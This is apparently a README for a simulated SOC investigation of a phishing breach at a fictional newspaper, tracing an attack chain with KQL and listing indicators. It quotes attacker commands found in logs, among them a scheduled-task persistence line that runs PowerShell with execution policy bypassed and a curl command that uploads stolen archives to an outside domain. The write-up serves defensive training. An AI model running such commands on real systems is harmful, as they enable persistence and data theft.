# 🛡️ Valdorian Times Cybersecurity Breach: A Real-World SOC Investigation 🧠

🎥 **[Watch Full Investigation Video (kql.mp4)](https://drive.google.com/file/d/1b-IJ2acGuVvpFf12_vAxgXWQosKQmrU3/view?usp=sharing)**  
> A realistic SOC simulation built with KQL, process analysis, phishing forensics, and file exfiltration tracking.

---

## 🚀 Overview

🔍 **Attack Type**: Spear-phishing → Credential Abuse → Scheduled Tasks → Document Forgery → Data Exfiltration  
💻 **Tech Used**: Microsoft Sentinel, KQL, PowerShell, Passive DNS  
🎯 **Goal**: Find out how attackers used fake editorial documents and stolen intern accounts to inject misinformation and steal data.

---

## 📊 Phase 1: Initial Recon & Activity

### 🔍 Lois Lane
- IP Address: `10.10.0.22`
- Visited: **62 unique websites**

### 🌐 Passive DNS Search
- Domains containing `"hire"`: **6**
- `jobhire.org` resolved to: `191.7.248.112`

### 🧑 Mary Activity
- Unique Websites: **58**
- Authentication Attempts: **70**

---

## 📩 Phase 2: Suspicious Email to Clark Kent

- Email received from: **ronnie_mclovin@valdoriantimes.news**
- Subject: `URGENT: Final OpEd Draft Edits`
- Attachment: `OpEdFinal_to_print.docx`
- Sent on: `2024-01-31T11:11:12.000Z`
- Clark received **21 total emails**

Ronnie claims she never sent this email. Compromise suspected.

---

## 🕵️‍♀️ Phase 3: Sonia Gose - The Senior Editor's Lead

- IP: `10.10.0.3`
- Host: `UL0M-MACHINE`
- Received phishing email from: `newspaper_jobs@gmail.com`
- Timestamp: `2024-01-05T09:42:05.000Z`
- Link: `https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx`

### 📥 File Details
- Downloaded: `C:\Users\sogose\Downloads\Valdorian_Times_Editorial_Offer_Letter.docx`
- SHA256: `60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f`

### 🪲 Malware Drop
- Dropped file: `hacktivist_manifesto.ps1`
- Created: `2024-01-05T10:24:32.000Z`

### 🛠 Scheduled Task
```bash
schtasks /create /sc hourly /mo 5 /tn "Hacktivist Manifesto" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1"
```
### 🧪 Commands Executed by the Attacker

After establishing a tunnel using `plink.exe`, the attacker executed the following commands on the compromised machine to perform network discovery and system enumeration:

```bash
whoami           # Identify the currently logged-in user
ipconfig         # Display IP configuration details
arp -a           # View the ARP cache to identify nearby network devices
tasklist /svc    # List running tasks along with associated services
net view         # Discover shared resources on the local network
```
---

## 💻 Phase 4: Ronnie McLovin - Intern Breach

- **IP**: `10.10.0.19`  
- **Host**: `A37A-DESKTOP`  
- **Received Email From**: `valdorias_best_recruiter@gmail.com`  
- **Timestamp**: `2024-01-10T08:48:16.000Z`  
- **Link Domain**: `promotionrecruit.org`

### 📥 File Details

- **Downloaded File**: `Editorial_J0b_Openings_2024.docx`
- **Dropped Payload**: `hacktivist_manifesto.ps1`  
- **Drop Time**: `2024-01-10T08:55:51.000Z`

### 🧠 Attacker Action

- **plink.exe Executed**  
  - **C2 IP**: `168.57.191.100`  
  - **Credentials Used**:  
    - Username: `$had0w`  
    - Password: `thruthW!llS3tUfree`

- **Scheduled Task Created**  
  - **Time**: `2024-01-10T10:26:32.000Z`  

- **Recon Commands Executed**:
```bash
whoami
ipconfig
arp -a
tasklist /svc
net view
```
---
## 📄 Phase 5: fakestory.docx → OpEdFinal_to_print.docx

- **Domain**: `hire-recruit.org`  
- **Downloaded File**: `fakestory.docx`  
- **SHA256**: `5f8a7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f`  
- **Created On**: `2024-01-31T09:47:51.000Z`

### ➡️ Renamed & Moved
```plaintext
C:\Users\romclovin\Documents\OpEdFinal_to_print.docx
```
Timestamp: 2024-01-31T10:26:20.000Z

📧 Sent via Email to Clark Kent: 2024-01-31T11:11:12.000Z
⏱️ Elapsed Time: 44 minutes

---

## 📦 Phase 6: Data Theft & Exfiltration

### 🗃️ Files Created by the Attacker
- `DankMemes.7z`
- `MyStolenDataFromDocuments.7z`
- `MyStolenDataFromDesktop.7z`

🔐 **Password for All Archives**: `thruthW!llS3tUfree`

### 📤 Exfiltration Command
```bash
curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php

```
🌐 Destination Domain: hirejob.com
---
## 📂 Repository Structure

```bash
Valdorian-Incident-Investigation/
├── README.md                      # 📝 Project summary and case details
├── kql.mp4                        # 🎥 Full investigation video
├── data/
│   ├── IOC_list.txt               # 📄 IPs, hashes, domains
│   └── investigation_logs.txt     # 🕵️ Full attack timeline & investigation steps
├── assets/
│   └── phishing_flowchart.png     # 🧭 (Optional) Visual representation of phishing chain
```
---
## 🧠 Learnings

 *KQL in action*: Real queries across web, DNS, authentication & process logs  
 *Tracking PowerShell scripts and scheduled tasks*
 *Detecting spear-phishing and content spoofing*  
 *Building incident timelines from metadata*
 *Reconstructing the attack chain from internal telemetry*
---------------------------------------------------------------------------------------------------------------
